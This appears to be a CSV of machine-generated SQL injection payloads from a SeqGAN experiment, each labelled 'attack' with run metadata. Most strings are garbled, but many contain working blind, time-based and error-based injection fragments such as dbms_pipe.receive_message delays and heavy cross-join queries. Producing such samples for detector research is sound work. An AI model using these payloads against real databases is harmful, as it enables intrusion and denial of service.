label,payload,family,payload_type,method,run_id,sample_index
attack,"1'+  (  select 'abpesbysse at_,up  um.dous ,l.tt_us t1t1,aunb$fgeseasutetdbe$tys as ag 2g  (  (  +char  (  (  (  (  =  122  (  (  )    =  +char  (     and   (  3393 or and    (  =     ,L   ||char  4018,s8446744073709551610uus a,bl_ ap1p_g a where(  =    ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '    (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,411
attack,1'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,412
attack,1%%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,413
attack,"1'  =  ''   )    )    or 5903  =    (  'uhs t380  (  repepe(  ||char  (  (  = or char  )    (  )    (  =unt(  (  = and,ftchar  (  (  (  +char  (  (  (  )  (  )    (  (  ||char  (  (  105  ) a,l_us tzys as"" t3  )      (  ,refesins as t2tiulmages andup_dszt2dadomombm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,414
attack,"1""        =  (   selectt_=  =    ""yobb"" dhrefy.sumabl_1yyb$arinyll_u     b,||char  )  u""  =  "",  (  (  0x7171706a71j char  fromu(    or ,69  (  (  =  (p_upimdmm.s asuntregtu_t_u",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,415
attack,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ')    cttef,ds 7522 9643leppps lll  case    (  =  6093 i   from astes t3   (  ,x   from 6849  (  ( when where c= where3)   (    =   , where and or char  (  uppcuoms unonbl_unbfe  ( p_im.dys t_kunt$rl_u,a,asus dd'  =  'omns",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,416
attack,"44621"" 85')    r  113  = or 8446744073709551610,0x717a767a71,dbds wherey      (  ||char  (  (    (  (  4165(  (  =   char  , din.tr  (  (  (  113   likes and where or char  (  (  +char  =    *  =   9198 or 7522  =g   )   oubas t1ing  =   (  106  (  or from a,sts t  0  =  char   ((  (  83  =  (  (  ,l_k",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,417
attack,"1null  )    (  )    else ip 4799(  (  then 6503  (  ( 'unusual'  =  from or cdlunplu_t t1g' or   ,sepchar  =  lepdrt  (    (  ,  (    =  =  *  (  (  and 7793 where  rupg and when ) rex     (  8571)    from t1gcuoub$tef.edbl_usea.syastas t2t3btchar  (  (  ) 3580",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,418
attack,"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ''   if   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,419
attack,"1')dg)    else or,s r _u    upst(  (  (  (  ,  (  (  (   (  (  (  =  ||char  = t  (  (  2642  (  (  (  ht  (  (  (  69  ,h(_,as fdu.do resypexdomase",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,420
attack,"1""  =  ""Nrelnsw.sdrds asszyzwb""  =  ""s 9643 3    (  =    then(  (  (  =    (    (  (  (  65  (  (intaupexp_t2s aptypft_un.tmllr1,,sds amnydb   aunsas where ds char  ,per  =  111   apefchar  =    ,select   )    and= a qfs endunsas asubm",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,421
attack,"1 t_tz'     rab$,*l t13862 asy.s 5485 domm.s tecub'  =  '.fgeg)    =   (  =    (  (  (   119",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,422
attack,1 ibwhenrt_uousy,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,423
attack,"1   )   =    lzo.te,lefing'     char  (    (  (  = 2724  from t    (  (  (char   (  (  = (  =  ,yp_ins dibmrtchar char  (  (  (  (  ('  (   from asyt_uumableping  (  (  5556  8459 1087  (  (  (  ' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,424
attack,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '"")   from a  6503 (  (  (  (  (  (  =  ||char  (  (  113  )  *   )      )    k   fromsdoex    (  83  +(  (  (  char  ,  (  (  (  (  (  (  ,  = concat  = t_,d,ds  (    (   (  (     ,reppepys _ r or char  (  ins as",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,425
attack,"1 where like c,s asd,dt_umbginsuommetp'  =  'gllir esys asefgugl' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '8315  hbl_usbl_uusin.gmam""  =  ""lmllw1617'  =  'aong8899  1048  u     )   abnp   ortchar  +char  106  113  (  (  (  = and  (    (  (  )   frommatjrain.staust% cb$fbas ugm500000000ta",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,426
attack,1'   )   from #    c 8571    (  ||  (  (  (  (  113  (  (  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,427
attack,"1"" or from from ,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,428
attack,"1'+  (  select ''   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'ng'      )   from t3) like as    122  (  (  2180 or cb4ringi$s t3b  122  (  capi.""  =  ""' or 'c' and from wheret(  (  (  (  select 8446744073709551610up  ,pef 9643  ( (  in  (  (     (  (  select t2,ses  from t1,unt1,char  (    (  )    =    (    (  (  (  =  ,ps as aorsinsabn..",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,429
attack,"-4"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""as char  6093ain.s ty,u    (  (  (  and   (    (  =  (  =    (  (  l_umasNriinsddes ab$cg in.ttchar  =  ,s char  2724    and    =    (  =      (  (/      , char  )    (  )    (  113  100    (  (    (    7683   (  (  (  1441  48np_s agg' or or char  (  +   char  ,char and    (  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,430
attack,-75389null  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,431
attack,"1""   ,do ab$tt  ,  ,(  (  (  (  3880        (  (  )    6849a4799  (   ,when,null  = ao,null  =  (    (  )  , char  select  500000000L  (  )    (p2  (  6671    (  =    =  (    char  ||char  100  (  (         )    (  (2(  ||char     )    (  (  (  (  (  (  =    (  (  (  from t1,a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,432
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adbeaolb  )   and and or and j      2027 9643  (  updousyt2,is tdun.ttchar  (char  (  (  122  (  (  =  =s )pp_s ains fin.flg  (  )    (  N||char  ucs _s where or  r  (  (  (  (  )  ,0x717a767a71)    (  (  (  (  (  (  (  (  hregh  (  ,500000000_una,rw.t",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,433
attack,1m,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,434
attack,"1%'%   t c(   ||char  ( char  (  )    )    (  ,--  )  (  1087 char  ||char  ,pp2fisygt1,ab$t1 fouuun.suks asyma,asdsy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,435
attack,"%%""   )   )    (    (  (  or char  (  (  (  )    (  (    (  (  (  (  (  1441  (  ) a(  =  =  (  112  (  (  ) where 113  (  (  (  =  (  )pains aoustupte",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,436
attack,"1'or   andgstallpl_ulul_tes ta,bp  t_,bombm.rt   ors ypecunsilm.s t(  +  +char  (char  (  ||char  char  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,437
attack,1%%'  =  '4165--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,438
attack,"1""  5000000000  )    )     ) t  6503 t2,ssinsin.guluns s .s as agull_usiumagnsy   --s t3  ||char  (  )  7522    (  1087  7793    =  (  (  (  ||char  (  (  (  (  80  =    (    (  2774s char    9354 upp_u where where '   )    )    or 5903  =    (  'inge",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,439
attack,1'+  (  select 't3,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,440
attack,"1'   from from ag  from t1,ztinstasr%pet j when t  ,500000000  (  (  (""  (  )    (  h  (  5000000002'  =  from euppegef 6671 as adetechar  (  =    =    (  select a(  65  char  (      (  (  (  )    1l_lpys tamnrupt_s as ain.g.sdn"" like ""hicin.s aodn",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,441
attack,1%%'--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,442
attack,"1""  =  ""9354au,ds tadbll_,d,n,t_umn.guus,s as and a,ep_us t1,lainginolomsmps dct_us where as   rej ,rt1t_(  lun.p_teb$g  lepe,a  ""yobb""un  ,alalom. asbl_gumabngeg_us as  ylle$f,do,astas ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,443
attack,"1ykt_k.dbb$regepdolefgum._ t1,b/t_ustins apcount_ ,pym' like 'nor a,unt2inousaasyp_uull_   (ese||uni  up  (   ,69  --  )   fromundib$f",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,444
attack,"1%""  =  """"  =  ""ef||char  113  ((  8459  (  ,  (  l_unhjger  ,aymnp""  =  ""gea,a.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,445
attack,"1""then",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,446
attack,"1""   rt_us a   (  (  = 3580  ,500000000(  (  =  (  orys ,efstims t(  )    (  122    (  =  (  (  ,66  =char  (  (  (  85 t2,  (  ,--piu,asun.dom.tand agesuft,bl_m.tec or where ' 8315    (  83  105     r   (  --s like,cmom.s frombm.gai$s or concatp_u",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,447
attack,1'   where/*3580,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,448
attack,"  121   )    (  )     8446744073709551610,char  (char  ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '  case' char  (  (  (  (  1441  )    (  ,rinmg cs us j  (  4018from 8691  (  =    (  (  ||char  ||char  (  (  (char  =  83  100ht  5485el_t2774s coms taudin.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,449
attack,"-8315""   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,450
attack,"1"" where wherey(  (  select _,s ailyunt  (   and    (  (  (  (  =    (  (  =   ,7417 co     intass   whereLec as(  )    t  (  (  (  )  )    (  3352    (  (  select or or",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,451
attack,"1""  ras ab$rdoun_htsubleblles alesterysul",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,452
attack,"1    where   ,null  ||char      )  =  )    (  (  =    (  (  c tchar     t' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||',,a=     (  )    char  =  = (  1087  (  106  (  (  (  113  ,ct1b  (  (  (   o4799b(  500000000px  (  107gzs   (  ,s orsus ,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,453
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%%'  =  '""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,454
attack,"1'||  (  select 'us as comat5u  t  (  *    (  (  =    (L  )     hyp_s and where 7522  (n  ,peco aastr agegegused.tdolds where concat  1087' or 'char  (  *   (  ""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  "")   )    (  (  (  (  (  or where t  0x7171706a71(  =  ( 3455  =  (     +100  ,  (  )      = 1661  (  118  = and     0  (  (  +char  (  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,455
attack,"1%1""  =  "",a,ausb_umtyreg1iounteg1tchar  (  (  (  f,abl_unes ' like 'udsing",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,456
attack,"  (  l_inv  aoumta,$les t  ( 1570  =  r  (  88    (  =  =    (  ,500000000  (  (  (  then  )    (  ||char  =    (   (  =eas ands    (  (    (  111  (  (  6503   ype2961p_undw d,agllm..syttalllefges orup.s msy ubmeudsys as as t1ountat af",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,457
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'zd' like 'iynz"" like ""duml')   fromin.=blel'as t1)oupttpl_ss from tdt4ubcsus yptas or kefg1)ub$s   abcwanstt 7793 t1,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,458
attack,1'   ) and    (  (    (  (  (  (  113  ==--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,459
attack,"1""      andluuulugt,s s aumnf andus 9643  (  =  ,null  ( or or   (  (  (  (  (  4799  ( or    (  6849  y   efint  lnhdonx +char  (  (/=  (  convert  7522  (    (  (  (  (  =  u  =  117 or or t(  (  (  3484 8691x  = a(  (  (  500000000(  (    (  65   (   =    (  (  (  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,460
attack,"1%c'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,461
attack,"18518z0h_g%  113  ,8899  )  =    (  (  '   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '  (  cs techar  (  *     ||char  =   from a assendh.ypegepet_upit1    asl""  =  ""hdb$6671t  (  gest2t  (  (  (  (  select    (  (  (  (  (  (  =eor t26849    (  =    (  (  122  0x7171706a71/",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,462
attack,"1%'  =  ''   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%1c+1,0'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,463
attack,"1%'  =  '""   )    from where 3  select 5286  (  (   cbp  =  (    (   (  or 7555sup  _us ab$l_uktdem",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,464
attack,"1%'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  '7770'  )   and 8148  =  like  (  'ecllllluundtad' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'%p  ||  * or ,  =p_fudte5000000000  (  (   (  (  *    t4 and _yps.r_blbtassup tmakheeb$comn dst1 ai$ung_s a,agmtmj as u77pesinfunb$aotalmanss at.bzs adoum.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,465
attack,"1%%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,466
attack,1%'  =  ''  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,467
attack,"1   )    =     )    /0x717a767a71,0  ,0  r t  (  (  =  ,7417  =    char  121  +char char  select or   (  = a1570s char  ,null  (  ( or and as from   dlag from tfrom t_f' combusu""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""4799tta,llus char  =  ,null 8446744073709551610   ,null  =    (  from a.tet char  10482642",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,468
attack,"1%'then    where and and(    (  83  =   from rt3118  select or  ,null like2642as a,trt3  =  =    (  (  end  select exp  (  (  (  )   hp_t  (  =  from ,seallm,s fk' like 'm..ss agestfongef/n.d#adbn,mt3862  bydppp_umd.nmdo and from t4   us coubn.tumgu",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,469
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ' rkpedol_s  _ulab$gesillesu'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'ng5,et_s as and 8446744073709551610  106uagudbl(lft4s t1,  (  (  7522 t  and jzg_3352masas atjdoumauuu$,as as t_ub$,docons t1ug,sin.andkb$f' and tr or refg' t8459  (    and  /*j qxp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,470
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,471
attack,"-2583'    and 4799  =   (  (  2180  (char  (  (  ||char  *  =  ,t2,rt f char aw or or p    (  (  )  (  =  (    (    =  ) (  ) or e,  (  (  =    (  /  or likettype*""  (tle(  (  ,(  (  ,0  (  65  = wherea,as ibpcfinb   _s as t1t1,s likesysas afgt",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,472
attack,"1   )    (  ,=  +char  (  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,473
attack,"-38809643  +char  (  122  (  (  1541    (  (  *    =  (  (  ,csyt_bl_ cbl  q,fl_ntge(  ( and          where oruk' or 'char  (  (  6671 qp_up",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,474
attack,1'+  (  select 'qeas andff'  =  'kb%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,475
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,476
attack,"1    )   from where3455  )    (  ||char  )  select and or   (  (  83 (mr  (  =    (  3484pill_r as res afsbst_ugin.ttep  (  (  (  (  (  (  r as o    )up_,ptt4  = att3  )p  100 _umif t  (  ||char  122  )   (  )    from ,0  =up_,s.stas t3  (  (  83  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,477
attack,1'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,478
attack,"14799 7417   abl_tl_eroeas aoundb$dom.staso,asblzs asdb,rdb$l_ulli",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,479
attack,"1""   )   from as aonm..szbsmuattgewhen    (  (  select  (   1048)    (  =  =/4906|| vu$ommn. f t1     (  500000000//2ang' where rog at_rredontt  (  112  )    (  (  (  =  from inint  =  t,when   )    (  (  (  (    ) t34165=    3862    (   (  1570    (  (  2774  ,null  (  =  (p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,480
attack,"1'end    =    (  (  (  (  (  (  ((  (  (  (  (  3484up  from from asus   mam.tas aouupds asumalt1,as t3mcth,t0x78Nsindsefksffun""  )  (  ||char  c=    (  (  (  *   s 1087( orinrt  (      48  from    =    =    8571  +  (  =  (  4799 char  (  (  up  (   (  65",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,481
attack,"-    3862""    g""   or  (  ,500000000' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||',0  (  1087 49y2 char  (  (  (  (  rcsu",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,482
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adomf$t1,r _  ||' and or,as t3(  ) ap_unt  )  (  83(  )   from 2180 char  (  )  )   = 9643/p  (  113  5485    122  (  65  from aomta.4462m.s ibble",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,483
attack,"1then2961'  =  ',adbllll_ 'unusual'  9643  (  +  (  3352select t  (  (  =  (  111  1541l$",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,484
attack,"1%8327    +char  =  uxm6388 3580  (  (  9643  (  (  (    (  (  (  --l _umaksybceps t 1mt2unt  (  (  select o  8403,,0  (  =    (  (  (  (  (  (  (  100  =    1178571u  )  (   from and  =   from am.ss t2,as r"" agh  (      = ahl_sses asustab$dtref2961es ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,485
attack,-%%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,486
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""inlds where c     rqn"" like ""e",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,487
attack,"1%%%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'd',rds a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,488
attack,"1'+  (  select '""",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,489
